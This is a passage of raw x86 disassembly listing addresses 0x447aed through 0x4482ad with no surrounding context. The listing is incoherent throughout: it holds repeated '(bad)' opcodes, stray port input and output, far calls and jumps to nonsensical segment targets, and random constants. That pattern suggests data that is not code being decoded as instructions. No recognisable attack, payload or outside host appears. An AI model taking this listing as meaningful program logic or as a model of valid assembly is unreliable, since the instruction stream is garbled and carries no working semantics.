  447aed:	lds    eax,FWORD PTR [esi-0x56]
  447af0:	mov    ds:0x18d3376c,eax
  447af5:	jecxz  0x447b5f
  447af7:	aad    0x56
  447af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447afa:	mov    eax,ds:0x1d928ccf
  447aff:	jno    0x447b16
  447b01:	adc    BYTE PTR [eax],al
  447b03:	in     al,dx
  447b04:	jns    0x447b14
  447b06:	dec    eax
  447b07:	aas    
  447b08:	(bad)  
  447b09:	cmp    DWORD PTR [ecx],ebx
  447b0b:	das    
  447b0c:	mov    ebx,0x48f637cb
  447b11:	or     edx,DWORD PTR [ebp-0x18daf9f8]
  447b17:	adc    DWORD PTR [ebp-0x58],ecx
  447b1a:	sti    
  447b1b:	and    al,0x16
  447b1d:	sbb    ebx,ecx
  447b1f:	xchg   ecx,eax
  447b20:	cmp    cl,al
  447b22:	bound  ecx,QWORD PTR [ecx+ecx*1-0x201888a5]
  447b29:	pop    ss
  447b2a:	call   0x4ed0:0x8b592475
  447b31:	cmp    al,0xff
  447b33:	frstor [ecx]
  447b35:	leave  
  447b36:	sbb    esi,edi
  447b38:	es pusha 
  447b3a:	adc    bl,ah
  447b3c:	xor    DWORD PTR [ecx-0x2494199a],ecx
  447b42:	mov    eax,ds:0x448760a8
  447b47:	jl     0x447b8e
  447b49:	or     BYTE PTR ds:0xc19770e8,cl
  447b4f:	push   es
  447b50:	sbb    ch,cl
  447b52:	jg     0x447b60
  447b54:	lahf   
  447b55:	(bad)  
  447b57:	out    0x6c,eax
  447b59:	and    dl,BYTE PTR [ebp-0x770c4791]
  447b5f:	into   
  447b60:	out    0xd4,eax
  447b62:	stos   DWORD PTR es:[edi],eax
  447b63:	adc    DWORD PTR [ecx*4+0x59ce5816],esp
  447b6a:	mov    ebx,0xbf02d630
  447b6f:	add    al,0xad
  447b71:	jmp    0x806a3836
  447b76:	shl    edx,1
  447b78:	and    al,BYTE PTR [eax-0x26e19693]
  447b7e:	xor    al,0x3e
  447b80:	je     0x447bca
  447b82:	xchg   BYTE PTR [ebp+0x1b8e1dfd],ah
  447b88:	shr    DWORD PTR [eax-0x368fb085],cl
  447b8e:	test   BYTE PTR [edi-0x16],dh
  447b91:	(bad)  
  447b92:	jbe    0x447bbe
  447b94:	mov    dl,0x6d
  447b96:	mov    bh,0xc4
  447b98:	stos   BYTE PTR es:[edi],al
  447b99:	icebp  
  447b9a:	js     0x447b5e
  447b9c:	push   ebp
  447b9d:	sub    DWORD PTR [ecx-0x11],edi
  447ba0:	inc    esp
  447ba1:	inc    eax
  447ba2:	push   ss
  447ba3:	sbb    al,0x1d
  447ba5:	dec    ecx
  447ba6:	jge    0x447b86
  447ba8:	lock out dx,al
  447baa:	jmp    0x447b96
  447bac:	jb     0x447b52
  447bae:	mov    esp,DWORD PTR [ecx-0x4]
  447bb1:	cli    
  447bb2:	cmp    eax,0xab1cdab6
  447bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447bb8:	and    eax,0x2cb6757e
  447bbd:	sub    DWORD PTR [ebp+esi*8-0x17ddccaf],0x56ebcb74
  447bc8:	and    esp,DWORD PTR [ebx+0x741de6b7]
  447bce:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447bd0:	and    ecx,DWORD PTR [ecx]
  447bd2:	leave  
  447bd3:	les    edx,FWORD PTR [esi]
  447bd5:	loopne 0x447bd5
  447bd7:	arpl   WORD PTR [esp+ebx*4-0x35d0a895],sp
  447bde:	retf   
  447bdf:	out    0x57,al
  447be1:	div    DWORD PTR [edi]
  447be3:	loope  0x447c50
  447be5:	aam    0xa5
  447be7:	mul    BYTE PTR [edi+0x0]
  447bea:	mov    edx,0x6ba62cec
  447bef:	imul   edx,DWORD PTR [edi],0xb9fd414f
  447bf5:	pop    ebp
  447bf6:	in     eax,0x67
  447bf8:	xchg   esp,eax
  447bf9:	cmp    BYTE PTR [edx-0x710a158c],dh
  447bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447c00:	pop    es
  447c01:	mov    ebx,0x36851c95
  447c06:	sbb    ebp,ebx
  447c08:	mov    cl,0x85
  447c0a:	or     dl,dl
  447c0c:	push   es
  447c0d:	mov    ah,0xbf
  447c0f:	xor    al,0x17
  447c11:	imul   DWORD PTR es:[edx]
  447c14:	jmp    0x447c7a
  447c16:	lahf   
  447c17:	ins    BYTE PTR es:[edi],dx
  447c18:	dec    ecx
  447c19:	push   eax
  447c1a:	mov    esp,0x84ed05d4
  447c1f:	xchg   cl,bl
  447c21:	out    dx,al
  447c22:	add    DWORD PTR [ebp+0x1a],esp
  447c25:	xchg   ecx,eax
  447c26:	or     BYTE PTR [edx],cl
  447c28:	std    
  447c29:	mov    al,0xdb
  447c2b:	cmp    BYTE PTR [ebp-0x5a],0x10
  447c2f:	dec    eax
  447c30:	sub    esp,ebx
  447c32:	pop    eax
  447c33:	pop    ss
  447c34:	fsubr  QWORD PTR [edx+0x4d]
  447c37:	(bad)  
  447c38:	and    esi,ebp
  447c3a:	mov    esi,0x41388d41
  447c3f:	sub    eax,0xe9816515
  447c44:	push   edi
  447c45:	mov    ch,0x27
  447c47:	dec    edx
  447c48:	inc    ebp
  447c49:	and    BYTE PTR [edx-0x415621d6],cl
  447c4f:	adc    al,0xa6
  447c51:	cli    
  447c52:	retf   
  447c53:	push   ebp
  447c54:	or     dh,BYTE PTR [esi-0x6a]
  447c57:	stos   DWORD PTR es:[edi],eax
  447c58:	lds    ebp,FWORD PTR [ebp+0x539c94eb]
  447c5e:	and    DWORD PTR [esi],eax
  447c60:	sbb    eax,0x52cd1fa9
  447c65:	and    dh,cl
  447c67:	int3   
  447c68:	jns    0x447c5f
  447c6a:	repnz shl BYTE PTR [ebp+0x5e],1
  447c6e:	xor    eax,0x92e799f4
  447c73:	aad    0xfa
  447c75:	mov    al,ds:0xd91ab5ee
  447c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447c7b:	sub    al,0xb1
  447c7d:	or     bl,ch
  447c7f:	out    0x9a,eax
  447c81:	fwait
  447c82:	cmp    ebp,edi
  447c84:	and    DWORD PTR [edx],ebx
  447c86:	cmp    al,0x2d
  447c88:	push   0xd94d6c88
  447c8d:	jp     0x447c41
  447c8f:	in     al,0xc
  447c91:	sub    al,0x55
  447c93:	sbb    DWORD PTR ds:0x6fe8451c,esi
  447c99:	addr16 push 0x19
  447c9c:	call   FWORD PTR [edx]
  447c9e:	pop    edx
  447c9f:	out    dx,eax
  447ca0:	and    eax,0x8e6a82b9
  447ca5:	inc    ebp
  447ca6:	dec    ecx
  447ca7:	push   ss
  447ca8:	push   ebp
  447ca9:	clc    
  447caa:	cmp    eax,0x12a74af0
  447caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447cb0:	dec    esi
  447cb1:	stc    
  447cb2:	jbe    0x447cac
  447cb4:	mov    ebx,0xa4c898b2
  447cb9:	call   0xefb8:0x6de5f397
  447cc0:	lds    edi,FWORD PTR [edx+eiz*1-0x4a]
  447cc4:	cmp    esi,DWORD PTR [edi]
  447cc6:	sub    DWORD PTR [ebp+esi*4+0x2bc4c170],ebp
  447ccd:	push   ss
  447cce:	xor    bh,BYTE PTR [edi+0x1b]
  447cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447cd2:	jnp    0x447cc5
  447cd4:	scas   al,BYTE PTR es:[edi]
  447cd5:	mov    BYTE PTR [edi],dl
  447cd7:	jb     0x447d08
  447cd9:	cmp    DWORD PTR [edx-0x499c579f],edx
  447cdf:	push   esp
  447ce0:	dec    eax
  447ce1:	xor    dh,ch
  447ce3:	mov    WORD PTR [eiz*1+0x191f4cd1],?
  447cea:	push   ebx
  447ceb:	mov    esp,0x28866c3b
  447cf0:	and    eax,0x32c063f9
  447cf5:	jp     0x447d4e
  447cf7:	pop    ss
  447cf8:	adc    al,0xa5
  447cfa:	mov    ebp,ebp
  447cfc:	push   ebx
  447cfd:	sub    al,0x54
  447cff:	shr    BYTE PTR [eax+0x61],cl
  447d02:	scas   eax,DWORD PTR es:[edi]
  447d03:	or     al,0x8c
  447d05:	mov    ds:0x3c311873,al
  447d0a:	dec    esp
  447d0b:	bound  ebp,QWORD PTR [ecx]
  447d0d:	daa    
  447d0e:	call   0x245a:0x55318638
  447d15:	call   0xfb8d:0x40a78b58
  447d1c:	fdivr  DWORD PTR [ebx]
  447d1e:	mov    esp,DWORD PTR [esi-0x41]
  447d21:	loopne 0x447d52
  447d23:	stc    
  447d24:	pop    edi
  447d25:	push   ds
  447d26:	mov    ecx,0x37b3b59a
  447d2b:	cld    
  447d2c:	out    0x79,eax
  447d2e:	(bad)  
  447d2f:	loope  0x447dac
  447d31:	sar    DWORD PTR [edi+ebp*8+0x7a],0x16
  447d36:	es xchg ebp,eax
  447d38:	and    al,0x8f
  447d3a:	mov    bl,0x3a
  447d3c:	rcl    DWORD PTR [esi],0x1c
  447d3f:	sub    BYTE PTR [esi],ah
  447d41:	cmp    al,0x23
  447d43:	fnstcw WORD PTR [ebx-0x37]
  447d46:	fsub   st(0),st
  447d48:	and    bh,cl
  447d4a:	in     eax,dx
  447d4b:	dec    esi
  447d4c:	adc    ebx,ebx
  447d4e:	fs fwait
  447d50:	jle    0x447d25
  447d52:	fld    TBYTE PTR [edx]
  447d54:	addr16 pop edi
  447d56:	inc    edi
  447d57:	jp     0x447d70
  447d59:	(bad)  
  447d5a:	stc    
  447d5b:	out    dx,al
  447d5c:	xor    al,0xe9
  447d5e:	xchg   edi,eax
  447d5f:	push   eax
  447d60:	push   edx
  447d61:	or     eax,edx
  447d63:	(bad)  [ecx]
  447d65:	or     BYTE PTR [edi],al
  447d67:	addr16 and eax,0x27eafb59
  447d6d:	jnp    0x447ddd
  447d6f:	mov    cl,0x23
  447d71:	cdq    
  447d72:	dec    esi
  447d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447d74:	hlt    
  447d75:	pop    eax
  447d76:	in     al,0xf2
  447d78:	jmp    0x6849:0xae142c8c
  447d7f:	push   edi
  447d80:	mov    bh,0x44
  447d82:	mov    cl,0xc8
  447d84:	xor    cl,cl
  447d86:	fdiv   st(4),st
  447d88:	popf   
  447d89:	add    BYTE PTR [ebx-0xf],bl
  447d8c:	ins    DWORD PTR es:[edi],dx
  447d8d:	popa   
  447d8e:	retf   
  447d8f:	and    DWORD PTR [esi-0x5e],0x7
  447d93:	jl     0x447d5d
  447d95:	(bad)  
  447d96:	fld    QWORD PTR [esi+0x32]
  447d99:	add    BYTE PTR [edi-0x7a4038ec],bh
  447d9f:	xlat   BYTE PTR ds:[ebx]
  447da0:	pushf  
  447da1:	nop    eax
  447da4:	xchg   esp,eax
  447da5:	arpl   WORD PTR [edi+0x4d31489a],cx
  447dab:	call   0xc570c73d
  447db0:	sub    ah,cl
  447db2:	sbb    BYTE PTR [edx-0x574062cf],ah
  447db8:	leave  
  447db9:	or     ch,ch
  447dbb:	gs in  eax,0x26
  447dbe:	mov    ah,ch
  447dc0:	cmp    eax,0x24fa5b8a
  447dc5:	cdq    
  447dc6:	cdq    
  447dc7:	xor    dh,al
  447dc9:	dec    esi
  447dca:	fwait
  447dcb:	aas    
  447dcc:	dec    ecx
  447dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447dce:	fwait
  447dcf:	pushf  
  447dd0:	adc    ebp,ebp
  447dd2:	arpl   WORD PTR [edi],di
  447dd4:	outs   dx,DWORD PTR ds:[esi]
  447dd5:	jge    0x447d68
  447dd7:	mov    ecx,0xd68ae25d
  447ddc:	jge    0x447d99
  447dde:	mov    al,0x6c
  447de0:	rcr    BYTE PTR es:[ebx],1
  447de3:	mov    cl,0x12
  447de5:	inc    esp
  447de6:	jge    0x447e45
  447de8:	pushf  
  447de9:	daa    
  447dea:	xor    al,0x55
  447dec:	push   ss
  447ded:	cdq    
  447dee:	or     eax,0x9982adf0
  447df3:	push   esi
  447df4:	lds    eax,FWORD PTR ds:0x9b065cdd
  447dfa:	imul   edx,DWORD PTR [ebx-0x4b196847],0xffffffa0
  447e01:	push   esp
  447e02:	rcl    BYTE PTR [ecx-0x3b4bcf0b],1
  447e08:	cmp    cl,al
  447e0a:	xor    al,0x60
  447e0c:	gs pop edx
  447e0e:	inc    esi
  447e0f:	jmp    0x447df7
  447e11:	sbb    al,0xf8
  447e13:	add    eax,0x853e1922
  447e18:	and    edx,esp
  447e1a:	idiv   edi
  447e1c:	nop
  447e1d:	adc    ecx,esp
  447e1f:	es in  eax,dx
  447e21:	ret    0x6aea
  447e24:	pop    ds
  447e25:	enter  0xe9d7,0x7b
  447e29:	pop    eax
  447e2a:	iret   
  447e2b:	sbb    BYTE PTR [ebx],0x99
  447e2e:	test   esp,ebp
  447e30:	xchg   esp,eax
  447e31:	neg    DWORD PTR [eax]
  447e33:	ja     0x447de5
  447e35:	cdq    
  447e36:	imul   ebx,esp,0xffffffef
  447e39:	adc    BYTE PTR [ebx+0x4f],bl
  447e3c:	fs push ds
  447e3e:	test   al,0x42
  447e40:	sbb    BYTE PTR [ebx-0x4c],dl
  447e43:	les    ecx,FWORD PTR [eax-0x6f]
  447e46:	push   esi
  447e47:	mov    cl,0x95
  447e49:	inc    edx
  447e4a:	jbe    0x447e44
  447e4c:	pushf  
  447e4d:	in     eax,dx
  447e4e:	ss add al,0x42
  447e51:	jge    0x447e5c
  447e53:	cld    
  447e54:	add    BYTE PTR [edx+esi*4+0x58],dh
  447e58:	mov    edx,DWORD PTR [edx+0x8]
  447e5b:	xchg   ebp,eax
  447e5c:	mov    eax,0x167f23a8
  447e61:	adc    al,0x42
  447e63:	es aad 0xfb
  447e66:	add    ch,dl
  447e68:	or     ah,BYTE PTR [ebp-0x1ec8edbd]
  447e6e:	gs and cl,bl
  447e71:	push   ds
  447e72:	outs   dx,DWORD PTR ds:[esi]
  447e73:	jne    0x447e7a
  447e75:	pop    es
  447e76:	fwait
  447e77:	jmp    0xf68e8179
  447e7c:	push   ebp
  447e7d:	repnz sub al,dh
  447e80:	fsubr  DWORD PTR [eax+0x992004c]
  447e86:	outs   dx,DWORD PTR ds:[esi]
  447e87:	fnstsw WORD PTR [edi+0x17f27308]
  447e8d:	or     BYTE PTR [edx],ah
  447e8f:	or     al,0xe8
  447e91:	ins    BYTE PTR es:[edi],dx
  447e92:	in     eax,dx
  447e93:	ja     0x447eeb
  447e95:	pushf  
  447e96:	aas    
  447e97:	cwde   
  447e98:	(bad)  
  447e99:	fld    st(7)
  447e9b:	mov    cl,0x1d
  447e9d:	or     DWORD PTR [ecx-0x27054069],edx
  447ea3:	add    BYTE PTR [edi],bl
  447ea5:	fwait
  447ea6:	imul   ebx,DWORD PTR [edx+0x36362462],0xffffffbc
  447ead:	xchg   ebx,eax
  447eae:	ror    BYTE PTR [ebx-0x4b4933c7],cl
  447eb4:	sub    ch,dh
  447eb6:	mov    ecx,0x5ba63d41
  447ebb:	es jnp 0x447e64
  447ebe:	idiv   BYTE PTR [ecx]
  447ec0:	mov    bh,0x7d
  447ec2:	sub    DWORD PTR [edx],esi
  447ec4:	xchg   ebp,eax
  447ec5:	fdivr  QWORD PTR [esi+0x56]
  447ec8:	add    eax,0xf308b93e
  447ecd:	lahf   
  447ece:	mov    ebx,0x3162887a
  447ed3:	mov    esi,0xa875d4b7
  447ed8:	or     eax,0xfbb4bdaa
  447edd:	and    DWORD PTR [esi-0x34395ad5],0x6d237ff3
  447ee7:	(bad)  
  447ee8:	daa    
  447ee9:	jmp    0xc6ca9f88
  447eee:	add    eax,ecx
  447ef0:	fs and eax,0x8d86c432
  447ef6:	dec    ecx
  447ef7:	fst    QWORD PTR [edi]
  447ef9:	sti    
  447efa:	fld    DWORD PTR [ecx]
  447efc:	pop    ebp
  447efd:	adc    ebp,DWORD PTR [edi]
  447eff:	shl    BYTE PTR [esi+0x53],0xbd
  447f03:	inc    esp
  447f04:	scas   al,BYTE PTR es:[edi]
  447f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447f06:	jmp    0xe0e6:0x86532519
  447f0d:	pop    ebp
  447f0e:	cmp    DWORD PTR [ebx+0x16],ecx
  447f11:	mov    eax,edx
  447f13:	xlat   BYTE PTR ds:[ebx]
  447f14:	in     eax,0xa4
  447f16:	std    
  447f17:	or     edx,DWORD PTR [ebx]
  447f19:	aaa    
  447f1a:	pop    ds
  447f1b:	adc    DWORD PTR [edi],edx
  447f1d:	xor    DWORD PTR [eax-0x3964aecd],esp
  447f23:	mov    ebp,0x4e743843
  447f28:	popa   
  447f29:	mov    dl,0xb2
  447f2b:	hlt    
  447f2c:	xchg   ebp,eax
  447f2d:	mov    ah,0xc3
  447f2f:	xor    al,0x9a
  447f31:	cld    
  447f32:	retf   
  447f33:	outs   dx,DWORD PTR ds:[esi]
  447f34:	mov    WORD PTR [ebx+0x34ecc61b],gs
  447f3a:	in     eax,dx
  447f3b:	inc    edi
  447f3c:	les    edi,FWORD PTR [eax+0x18]
  447f3f:	dec    BYTE PTR cs:[ecx-0x467a4b46]
  447f46:	mov    edx,0xfd1b657a
  447f4b:	in     eax,0x2c
  447f4d:	dec    esp
  447f4e:	mov    bh,BYTE PTR [esi]
  447f50:	push   ds
  447f51:	test   eax,0x3712ea80
  447f56:	sbb    bl,cl
  447f58:	ja     0x447ef8
  447f5a:	stos   DWORD PTR es:[edi],eax
  447f5b:	adc    eax,0xc2e3f578
  447f60:	jbe    0x447fcd
  447f62:	div    ah
  447f64:	imul   esi,eax,0xffffffb5
  447f67:	je     0x447fe1
  447f69:	dec    ecx
  447f6a:	sahf   
  447f6b:	add    al,0x95
  447f6d:	sbb    BYTE PTR [ebp-0x14],al
  447f70:	jmp    0x20e47ce6
  447f75:	cmp    DWORD PTR [ecx],edi
  447f77:	fdivr  DWORD PTR [edi]
  447f79:	jb     0x447f00
  447f7b:	stc    
  447f7c:	in     al,0xd5
  447f7e:	or     eax,DWORD PTR [edx+0x7]
  447f81:	or     al,0xd
  447f83:	add    al,0x18
  447f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447f86:	xchg   ebp,eax
  447f87:	imul   edi,ebp,0x4ffe4480
  447f8d:	imul   edi,DWORD PTR [ecx+0x405d0a84],0x7a
  447f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447f95:	add    DWORD PTR [ebx-0xd],0x28
  447f99:	pushw  ss
  447f9b:	xchg   esp,eax
  447f9c:	sub    ch,BYTE PTR [ecx+0x29743762]
  447fa2:	jo     0x448018
  447fa4:	fist   WORD PTR [edi]
  447fa6:	or     al,0x9d
  447fa8:	in     eax,0x98
  447faa:	xchg   esi,eax
  447fab:	lock sahf 
  447fad:	int3   
  447fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447faf:	out    0xff,al
  447fb1:	call   0x701:0x4e49a616
  447fb8:	sbb    DWORD PTR [ecx-0x3c],0xffffffc4
  447fbc:	fs inc edi
  447fbe:	ss lock and al,0x3f
  447fc2:	jmp    0x95eb:0xbce5d5f8
  447fc9:	ja     0x447f75
  447fcb:	push   ecx
  447fcc:	fdiv   DWORD PTR [eax+0x1c]
  447fcf:	ffreep st(7)
  447fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447fd2:	arpl   WORD PTR [eax+0x4a],cx
  447fd5:	mov    ah,0xb2
  447fd7:	ret    0x999c
  447fda:	stos   DWORD PTR es:[edi],eax
  447fdb:	iret   
  447fdc:	or     al,0x7d
  447fde:	inc    ecx
  447fdf:	or     eax,0x27fd249b
  447fe4:	mov    ebp,0x22b4bf5f
  447fe9:	mov    eax,0xd266ecbf
  447fee:	mov    cl,0xb
  447ff0:	jns    0x447fa3
  447ff2:	sbb    DWORD PTR [ebp-0x14],esi
  447ff5:	xchg   edi,eax
  447ff6:	mov    edi,0xb52800e2
  447ffb:	and    al,0x11
  447ffd:	test   BYTE PTR [esi+0x30f955be],dl
  448003:	out    dx,eax
  448004:	push   esp
  448005:	sbb    al,0xc1
  448007:	inc    edi
  448008:	sbb    bh,BYTE PTR [ecx]
  44800a:	xchg   DWORD PTR [esi-0x707b6cda],edi
  448010:	mov    ecx,0xc9daeba6
  448015:	ins    DWORD PTR es:[edi],dx
  448016:	xor    edi,edi
  448018:	rcr    DWORD PTR [esi],1
  44801a:	or     DWORD PTR [ebx+0x54ba7a65],eax
  448020:	(bad)  
  448022:	repz cmp dl,dh
  448025:	and    ebp,DWORD PTR [ebp+0x20]
  448028:	rcr    DWORD PTR [edi-0x7e],0xb2
  44802c:	sbb    DWORD PTR [esi],0xa91e53ca
  448032:	mov    ch,0xa7
  448034:	push   0x48a0d346
  448039:	mov    ds:0x5067d14b,eax
  44803e:	and    ch,BYTE PTR [ebx]
  448040:	ss inc edi
  448042:	imul   cl
  448044:	mov    esp,0x2564ff25
  448049:	or     DWORD PTR [ebx+esi*2],0xc49ba321
  448050:	data16 adc BYTE PTR [esi],cl
  448053:	data16 adc BYTE PTR [ebp+ecx*4-0x77],cl
  448058:	jno    0x447ffc
  44805a:	mov    ebx,eax
  44805c:	dec    eax
  44805d:	adc    dh,0xa5
  448060:	mov    esi,0x999ceba4
  448065:	inc    di
  448067:	jmp    0x448014
  448069:	jmp    0x448065
  44806b:	fld    DWORD PTR [eax+0x624b16f]
  448071:	sub    esi,ebx
  448073:	dec    edi
  448074:	mov    ch,0xde
  448076:	sti    
  448077:	out    0x5a,al
  448079:	je     0x4480bd
  44807b:	les    ebx,FWORD PTR [ebp-0x49]
  44807e:	pop    es
  44807f:	xor    BYTE PTR [ecx],bl
  448081:	fnstenv [ecx]
  448083:	dec    esp
  448084:	jmp    FWORD PTR [edi+eax*1-0x3d]
  448088:	popf   
  448089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44808a:	sti    
  44808b:	inc    edi
  44808c:	fldenv [eax+ebp*4]
  44808f:	pusha  
  448090:	nop
  448091:	adc    esi,edx
  448093:	mov    al,ds:0x1594cd29
  448098:	sbb    edi,eax
  44809a:	ret    0xfaf3
  44809d:	pop    edx
  44809e:	and    edx,DWORD PTR [ebp-0x138ecb5b]
  4480a4:	or     dh,dl
  4480a6:	stos   BYTE PTR es:[edi],al
  4480a7:	stc    
  4480a8:	mov    gs,ecx
  4480aa:	(bad)  
  4480ab:	and    BYTE PTR [edx+0x47],dl
  4480ae:	mov    ebp,0xb0422fcb
  4480b3:	xchg   esi,eax
  4480b4:	je     0x448053
  4480b6:	fcmovnb st,st(5)
  4480b8:	cmp    DWORD PTR [ebx+eax*4],edx
  4480bb:	ret    
  4480bc:	test   eax,0xb9f85104
  4480c1:	xchg   ebp,eax
  4480c2:	shl    DWORD PTR [ecx+eax*2+0x30906a83],0xa2
  4480ca:	jnp    0x448100
  4480cc:	mov    edx,0x31d1314d
  4480d1:	pop    ss
  4480d2:	nop
  4480d3:	adc    BYTE PTR [ecx],al
  4480d5:	sbb    DWORD PTR [ecx+0x33bcbb74],esi
  4480db:	xchg   esp,eax
  4480dc:	test   DWORD PTR [eax+0x28],esp
  4480df:	lock std 
  4480e1:	push   0xffffff84
  4480e3:	rol    BYTE PTR [eax],1
  4480e5:	or     cl,ah
  4480e7:	mov    edx,0x2e39a6a
  4480ec:	xor    dh,BYTE PTR [ebx]
  4480ee:	push   edi
  4480ef:	xor    eax,0xe564f695
  4480f4:	cwde   
  4480f5:	mov    ebp,0x891cce1e
  4480fa:	pop    esp
  4480fb:	jge    0x448092
  4480fd:	lahf   
  4480fe:	xor    BYTE PTR [ebx],bl
  448100:	dec    ebp
  448101:	(bad)  
  448102:	(bad)  
  448103:	iret   
  448104:	jne    0x448135
  448106:	test   bh,ch
  448108:	out    0xb8,al
  44810a:	call   0x18e8:0x28c31834
  448111:	sbb    DWORD PTR [esi],ebx
  448113:	stos   BYTE PTR es:[edi],al
  448114:	enter  0xfb55,0xd9
  448118:	xor    eax,0x253019c5
  44811d:	pop    ss
  44811e:	arpl   bp,bp
  448120:	add    al,0xe1
  448122:	cmc    
  448123:	push   edx
  448124:	fadd   QWORD PTR [eax]
  448126:	push   ecx
  448127:	lea    edx,[ebp+0x26]
  44812a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44812b:	(bad)  
  44812e:	(bad)  
  44812f:	jmp    0xebb01c90
  448134:	cld    
  448135:	daa    
  448136:	add    BYTE PTR [edi-0x4e],ah
  448139:	call   0xf4b3:0x20cf369d
  448140:	les    ebx,FWORD PTR [edi]
  448142:	retf   
  448143:	mov    eax,edi
  448145:	shl    DWORD PTR [edx],cl
  448147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448148:	push   es
  448149:	add    BYTE PTR gs:[edx],al
  44814c:	pop    esi
  44814d:	js     0x448158
  44814f:	pop    edx
  448150:	arpl   WORD PTR [ebx],dx
  448152:	cld    
  448153:	xor    DWORD PTR [esi-0x61],edx
  448156:	int    0x14
  448158:	cs xchg ebp,eax
  44815a:	mov    ebx,0xf0a290f8
  44815f:	repz jg 0x4480fb
  448162:	dec    ebx
  448163:	add    BYTE PTR [eax-0x7d4f6074],bh
  448169:	repz ror BYTE PTR [esi+0x10],1
  44816d:	enter  0xc4b2,0xb5
  448171:	sub    bl,al
  448173:	shl    dh,cl
  448175:	out    dx,al
  448176:	dec    esi
  448177:	mov    ds:0xa25d4919,eax
  44817c:	xor    BYTE PTR [edi],bh
  44817e:	iret   
  44817f:	std    
  448180:	and    eax,0x3b34b11a
  448185:	hlt    
  448186:	arpl   WORD PTR [ebx],ax
  448188:	mov    esp,eax
  44818a:	es stos BYTE PTR es:[edi],al
  44818c:	pop    ecx
  44818d:	jae    0x44815b
  44818f:	xchg   esp,eax
  448190:	mov    ds:0xcf05379b,al
  448195:	jmp    0xa6f9aa23
  44819a:	or     esi,DWORD PTR [edi+0x65979e74]
  4481a0:	inc    ebp
  4481a1:	pop    ds
  4481a2:	(bad)
  4481a5:	daa    
  4481a6:	sub    al,0x6e
  4481a8:	sbb    al,0x59
  4481aa:	popf   
  4481ab:	in     eax,0xbf
  4481ad:	retf   
  4481ae:	pop    eax
  4481af:	mov    esp,0xdeb05fc8
  4481b4:	sbb    DWORD PTR [ecx-0x36],edi
  4481b7:	(bad)  
  4481b8:	clc    
  4481b9:	fisubr WORD PTR [edx+0x4f]
  4481bc:	push   ebx
  4481bd:	mov    edi,0x257c9f12
  4481c2:	hlt    
  4481c3:	mov    ebp,0xc82ce43a
  4481c8:	fsubr  DWORD PTR [edx]
  4481ca:	call   0xe930fd65
  4481cf:	push   esp
  4481d0:	mov    esi,0xf0047632
  4481d5:	repz mov bh,0xc0
  4481d8:	xchg   ebp,eax
  4481d9:	out    0x93,eax
  4481db:	add    eax,0xf3bc1dd1
  4481e0:	xchg   ebx,eax
  4481e1:	mov    al,ds:0xfa8ea1fb
  4481e6:	stos   DWORD PTR es:[edi],eax
  4481e7:	dec    edi
  4481e8:	jmp    0x44821a
  4481ea:	clc    
  4481eb:	test   eax,0xa596f73f
  4481f0:	shr    DWORD PTR [edx+eax*2-0x12],0xc3
  4481f5:	lahf   
  4481f6:	stos   DWORD PTR es:[edi],eax
  4481f7:	sbb    ebp,DWORD PTR [eax]
  4481f9:	push   esp
  4481fa:	dec    esi
  4481fb:	push   0xffffffd2
  4481fd:	push   0x31c26478
  448202:	mov    edx,0x93219e24
  448207:	jp     0x44822e
  448209:	cdq    
  44820a:	in     eax,0xed
  44820c:	inc    eax
  44820d:	mov    al,0xd1
  44820f:	fistp  WORD PTR [ecx]
  448211:	stc    
  448212:	mov    ch,0x55
  448214:	push   eax
  448215:	xor    edi,edi
  448217:	xchg   edx,eax
  448218:	pusha  
  448219:	in     eax,dx
  44821a:	and    ch,BYTE PTR [eiz*1+0x28eaa10b]
  448221:	fbstp  TBYTE PTR [eax+0x71a0b4bf]
  448227:	(bad)  
  448228:	pop    ss
  448229:	fld    DWORD PTR [ebp+0x4c]
  44822c:	fs push ecx
  44822e:	cmp    eax,0x7b9c044c
  448233:	mov    bh,0x1
  448235:	sub    eax,0x510f6cbd
  44823a:	idiv   BYTE PTR [edi-0x77]
  44823d:	xchg   esi,eax
  44823e:	call   0x564a997
  448243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448244:	and    ebx,ecx
  448246:	shl    bl,cl
  448248:	test   DWORD PTR [edx],0x1fb3c183
  44824e:	dec    edx
  44824f:	push   ebx
  448250:	push   ebp
  448251:	xchg   BYTE PTR [esi-0x7bb95d0f],bl
  448257:	aam    0xae
  448259:	fs ins DWORD PTR es:[edi],dx
  44825b:	in     eax,0x36
  44825d:	lahf   
  44825e:	addr16 or ebp,0x6258082a
  448265:	cwde   
  448266:	loop   0x448217
  448268:	imul   ebx,DWORD PTR [ebx],0xffffffb4
  44826b:	fs test al,0x31
  44826e:	sub    edi,edx
  448270:	adc    eax,0x1fec135f
  448275:	pushf  
  448276:	jne    0x44825b
  448278:	or     eax,0xd5f72eca
  44827d:	test   al,0xa7
  44827f:	mov    cl,dh
  448281:	std    
  448282:	cmc    
  448283:	jmp    0x56a5:0xe5d82385
  44828a:	stos   BYTE PTR es:[edi],al
  44828b:	xor    edx,edi
  44828d:	sub    dh,BYTE PTR [ecx]
  44828f:	test   al,0x25
  448291:	leave  
  448292:	fst    QWORD PTR [edi+0x24]
  448295:	mov    dl,bl
  448297:	call   0xebe46161
  44829c:	enter  0x7590,0xd6
  4482a0:	sbb    eax,0x824a5a79
  4482a5:	mov    ebp,ds
  4482a7:	je     0x4482b9
  4482a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4482aa:	sbb    edx,esi
  4482ac:	cld    
  4482ad:	bound  eax,QWORD PTR [ebp+ebp*2+0x6b]
